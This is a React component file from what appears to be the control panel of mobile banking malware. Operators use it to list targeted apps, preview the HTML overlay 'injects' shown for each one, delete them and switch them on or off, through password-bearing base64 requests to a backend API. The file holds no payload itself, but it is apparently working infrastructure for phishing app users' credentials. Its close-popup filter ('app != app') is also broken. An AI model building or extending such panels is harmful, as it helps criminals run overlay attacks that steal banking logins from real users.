import PropTypes from 'prop-types';
import React, { useState, useEffect } from "react";
import InformationCircleIcon from '@heroicons/react/24/solid/InformationCircleIcon';
import SettingsContext from '../../settings';
import { format } from 'date-fns';
import $ from 'jquery';
import {
  Dialog,
  DialogTitle,
  DialogContent,
  DialogContentText,
  DialogActions,
  Avatar,
  Box,
  Card,
  Checkbox,
  SvgIcon,
  Button,
  Stack,
  Table,
  TableBody,
  TableCell,
  TableHead,
  TablePagination,
  TableRow,
  Typography,
  Switch
} from '@mui/material';
import { Scrollbar } from 'src/components/scrollbar';
import { getInitials } from 'src/utils/get-initials';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faAppleAlt, faGlobe, faKey, faMobileAlt, faMobileButton, faSitemap, faSpinner, faTrash, faUsd, faUser } from '@fortawesome/free-solid-svg-icons';
import Link from 'next/link';
import Popup from 'reactjs-popup'
import { toast } from 'react-toastify';

import 'react-toastify/dist/ReactToastify.css';

  
export const InjectionsTable = (props) => {
  const {
    count = 0,
    items = [],
    onDeselectAll,
    onDeselectOne,
    onPageChange = () => {},
    onRowsPerPageChange,
    onSelectAll,
    onSelectOne,
    page = 0,
    rowsPerPage = 0,
    selected = [],
  } = props;

  const [openPopups, setOpenPopups] = useState([]);
  const [popupData, setPopupData] = useState(null);

  const fetchHtmlInj = (app) => {
      let request = $.ajax({
        type: 'POST',
        url: SettingsContext.restApiUrl,
        data: {
            'params': new Buffer('{"request":"getHtmlFileOfInject", "app":"' + app + '","password":"' + SettingsContext.password + ' "}').toString('base64')
        }
      });
    
    request.done(function(msg) {
        try {
            console.log(JSON.parse(msg).html)
            const blob = new Blob([atob(JSON.parse(msg).html)], { type: 'text/html' });
            setPopupData(URL.createObjectURL(blob))
        }
        catch (ErrMgs) {
            console.log('Error - ' + ErrMgs);
        }
    }.bind(this));
  };

  const handleChangeInjStatus = (app) => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params': new Buffer('{"request":"changeStatusInj", "app":"' + app + '","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });
  };

  const DeleteInj = (app) => {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params': new Buffer('{"request":"deleteHtmlInjection", "app":"' + app + '","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });
  };
  
  const handleOpenPoup = (app) => {
    setOpenPopups([...openPopups, app]);
    fetchHtmlInj(app);
  };

  const handleClosePopup = (app) => {
    setOpenPopups(openPopups.filter(app => app != app));
    setPopupData(null)
  };

    return (
      <Card>
        <Scrollbar>
          <Box sx={{ minWidth: 800 }}>
            <Table>
              <TableHead>
                <TableRow>
                  <TableCell>
                    App
                  </TableCell>
                  <TableCell>
                    Name
                  </TableCell>
                  <TableCell>
                    Type
                  </TableCell>
                  <TableCell>
                    HTML
                  </TableCell>
                  <TableCell>
                    Edit
                  </TableCell>
                  <TableCell>
                    Status
                  </TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {items.map((customer) => {

                  return (
                    <TableRow
                      hover
                      key={customer.app}
                    >
                      <TableCell>
                      <div style={{ display: 'flex', alignItems: 'center' }}>
                        <Avatar src={"data:image/png;base64," + customer.icon} />
                        <Typography marginLeft={2} variant="subtitle2">
                          {customer.app}
                        </Typography>
                        </div>
                      </TableCell>
                      <TableCell>
                        {customer.name === "NULL" ? "undefined" : customer.name}
                      </TableCell>
                      <TableCell>
                        {customer.cat === "NULL" ? "undefined" : customer.cat}
                      </TableCell>
                      <TableCell>
                      <Button
                          style={{width: "200px"}}
                          startIcon={(
                            <SvgIcon fontSize="small">
                              <FontAwesomeIcon icon={faGlobe}/>
                            </SvgIcon>
                          )} onClick={() => handleOpenPoup(customer.app)}
                          variant="contained"
                          >
                          SHOW HTML
                        </Button>
                      <Popup onClose={() => handleClosePopup(customer.app)} open={openPopups.includes(customer.app)} modal>
                        {popupData !== null ? <div><iframe src={popupData} title="inj" width="350" height="700"/></div> : <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', animation: 'spin 1s infinite linear',}}>
                <FontAwesomeIcon icon={faSpinner} spin size="10x" /></div>}
                      </Popup>
                      </TableCell> 
                      <TableCell>
                      <Button
                          style={{width: "120px"}}
                          startIcon={(
                            <SvgIcon fontSize="small">
                              <FontAwesomeIcon icon={faTrash}/>
                            </SvgIcon>
                          )} onClick={() => {DeleteInj(customer.app); toast.success("Successfully deleted " + customer.app)}}
                          variant="contained"
                          >
                          Delete
                        </Button>
                      </TableCell>
                      <TableCell>
                        <Switch defaultChecked={customer.status === "1"} onChange={() => handleChangeInjStatus(customer.app)} color='info'/>
                      </TableCell>
                    </TableRow>
                  );
                })}
              </TableBody>
            </Table>
          </Box>
        </Scrollbar>
        <TablePagination
          component="div"
          count={count}
          onPageChange={onPageChange}
          onRowsPerPageChange={onRowsPerPageChange}
          page={page}
          rowsPerPage={rowsPerPage}
          rowsPerPageOptions={[10, 100, 300]}
        />
      </Card>
    );
  }


InjectionsTable.propTypes = {
  count: PropTypes.number,
  items: PropTypes.array,
  onDeselectAll: PropTypes.func,
  onDeselectOne: PropTypes.func,
  onPageChange: PropTypes.func,
  onRowsPerPageChange: PropTypes.func,
  onSelectAll: PropTypes.func,
  onSelectOne: PropTypes.func,
  page: PropTypes.number,
  rowsPerPage: PropTypes.number,
  selected: PropTypes.array
};